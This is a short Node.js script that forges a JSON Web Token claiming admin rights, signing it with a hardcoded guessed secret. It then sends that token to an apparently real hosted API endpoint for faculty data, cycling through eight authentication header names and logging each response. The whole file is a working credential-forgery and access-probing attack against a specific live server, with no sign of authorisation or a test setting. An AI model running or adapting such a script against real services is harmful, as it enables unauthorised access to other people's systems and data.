const crypto = require('crypto');
const secret = 'my_super_secret_admin_key_123';
const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
const payload = Buffer.from(JSON.stringify({ role: 'admin', iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000) + 600 })).toString('base64url');
const signature = crypto.createHmac('sha256', secret).update(`${header}.${payload}`).digest('base64url');
const token = `${header}.${payload}.${signature}`;
console.log('TOKEN', token);
const url = 'https://ks-server-hqsn.onrender.com/api/faculty';
const variants = [
  { 'authorization': `Bearer ${token}` },
  { 'authorization': token },
  { 'x-auth-token': token },
  { 'x-access-token': token },
  { 'token': token },
  { 'auth-token': token },
  { 'x-token': token },
  { 'x-api-key': token },
];

(async () => {
  for (const h of variants) {
    try {
      const res = await fetch(url, { headers: h });
      const txt = await res.text();
      console.log('TRY', JSON.stringify(h), '=>', res.status, txt.replace(/\n/g, ' ').slice(0, 500));
    } catch (err) {
      console.error('ERR', JSON.stringify(h), err.message);
    }
  }
})();
